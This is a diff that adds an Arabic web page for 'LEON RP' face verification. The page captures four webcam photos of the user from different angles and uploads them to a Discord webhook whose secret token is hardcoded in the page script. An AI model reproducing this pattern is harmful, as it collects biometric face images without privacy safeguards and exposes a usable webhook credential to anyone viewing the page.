@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LEON RP - التحقق من الوجه</title>
+    <style>
+        body {
+            background: #111;
+            color: white;
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin: 0;
+            padding: 20px;
+        }
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+            background: #222;
+            padding: 20px;
+            border-radius: 15px;
+            border: 2px solid #ffcc00;
+        }
+        h2 { color: #ffcc00; margin-bottom: 5px; }
+        .instruction {
+            font-size: 18px;
+            font-weight: bold;
+            color: #00e676;
+            background: #333;
+            padding: 10px;
+            border-radius: 8px;
+            margin: 15px 0;
+            border: 1px dashed #00e676;
+        }
+        .camera-box {
+            position: relative;
+            width: 100%;
+            height: 320px;
+            border: 2px solid #ffcc00;
+            border-radius: 10px;
+            overflow: hidden;
+            background: #000;
+        }
+        video, canvas {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        button {
+            background: #ffcc00;
+            color: #000;
+            border: none;
+            padding: 12px 25px;
+            font-weight: bold;
+            font-size: 16px;
+            border-radius: 8px;
+            cursor: pointer;
+            margin-top: 15px;
+            width: 100%;
+        }
+        .preview-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 5px;
+            margin-top: 15px;
+        }
+        .preview-grid img {
+            width: 100%;
+            height: 70px;
+            object-fit: cover;
+            border-radius: 5px;
+            border: 1px solid #ffcc00;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h2>التحقق من الوجه 👤</h2>
+    <p style="color: #aaa; font-size: 13px;">يرجى اتباع التعليمات والتقاط الصور من 4 اتجاهات</p>
+
+    <!-- نص التوجيه الحركي -->
+    <div class="instruction" id="stepText">الخطوة 1 من 4: انظر إلى (اليمين ➡️) ثم اضغط التقاط</div>
+
+    <div class="camera-box">
+        <video id="webcam" autoplay playsinline muted></video>
+    </div>
+
+    <button type="button" id="actionBtn" onclick="captureStep()">📸 التقاط الصورة</button>
+
+    <!-- المعاينة المصغرة للصور الأربعة -->
+    <div class="preview-grid" id="previewGrid"></div>
+</div>
+
+<script>
+    const video = document.getElementById('webcam');
+    const stepText = document.getElementById('stepText');
+    const actionBtn = document.getElementById('actionBtn');
+    const previewGrid = document.getElementById('previewGrid');
+
+    // رابط الـ Webhook الخاص بك في ديسكورد
+    const webhookURL = "https://discord.com/api/webhooks/1533558289059807393/ya8LKj2P6eiby1e6fWgPgLv4M_DwAwG7VgiwZ0cJx_Ake7G1KsgTco7Jjr5sSlQniSvI";
+
+    const steps = [
+        { text: "الخطوة 1 من 4: انظر إلى (اليمين ➡️) ثم اضغط التقاط", label: "يمين" },
+        { text: "الخطوة 2 من 4: انظر إلى (اليسار ⬅️) ثم اضغط التقاط", label: "شمال" },
+        { text: "الخطوة 3 من 4: انظر إلى (الأعلى ⬆️) ثم اضغط التقاط", label: "فوق" },
+        { text: "الخطوة 4 من 4: انظر إلى (الأسفل ⬇️) ثم اضغط التقاط", label: "تحت" }
+    ];
+
+    let currentStep = 0;
+    let capturedImages = [];
+
+    // تشغيل الكاميرا
+    function startCamera() {
+        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+            .then(stream => { video.srcObject = stream; })
+            .catch(err => { alert("يرجى فتح الموقع برابط HTTPS وتفعيل الكاميرا!"); });
+        }
+    }
+    window.onload = startCamera;
+
+    // دالة التقاط الصورة لكل خطوة
+    function captureStep() {
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth || 640;
+        canvas.height = video.videoHeight || 480;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        
+        const imageData = canvas.toDataURL('image/jpeg', 0.8);
+        capturedImages.push({ label: steps[currentStep].label, data: imageData });
+
+        // إضافة صورة مصغرة في الشاشة
+        const imgThumb = document.createElement('img');
+        imgThumb.src = imageData;
+        previewGrid.appendChild(imgThumb);
+
+        currentStep++;
+
+        if (currentStep < steps.length) {
+            stepText.innerText = steps[currentStep].text;
+        } else {
+            stepText.innerText = "✅ تم التقاط جميع الصور! جاري الإرسال...";
+            actionBtn.disabled = true;
+            sendImagesToDiscord();
+        }
+    }
+
+    // دالة تحويل الصور وإرسالها إلى الديسكورد
+    async function sendImagesToDiscord() {
+        actionBtn.innerText = "جاري رفع الصور إلى ديسكورد...";
+
+        const formData = new FormData();
+        
+        // تجهيز نص الرسالة
+        const payload = {
+            content: "🚨 **تم اكتمال التحقق من الوجه!**\nمخصص للمراجع: **jooy0856_87924**",
+            embeds: [{
+                title: "📸 صور التحقق 4D (يمين - شمال - فوق - تحت)",
+                color: 65280,
+                timestamp: new Date()
+            }]
+        };
+        
+        formData.append('payload_json', JSON.stringify(payload));
+
+        // تحويل كل صورة من Base64 إلى ملف وإضافته للـ FormData
+        for (let i = 0; i < capturedImages.length; i++) {
+            const blob = await (await fetch(capturedImages[i].data)).blob();
+            formData.append(`file${i+1}`, blob, `face_${capturedImages[i].label}.jpg`);
+        }
+
+        fetch(webhookURL, {
+            method: 'POST',
+            body: formData
+        })
+        .then(res => {
+            if (res.ok || res.status === 204) {
+                alert("✅ تم إرسال صور التحقق بنجاح إلى الإدارة!");
+                location.reload();
+            } else {
+                alert("❌ حدث خطأ أثناء إرسال الصور.");
+                actionBtn.disabled = false;
+                actionBtn.innerText = "إعادة المحاولة";
+            }
+        })
+        .catch(err => {
+            alert("❌ خطأ في الاتصال بالشبكة!");
+            actionBtn.disabled = false;
+        });
+    }
+</script>
+
+</body>
+</html>
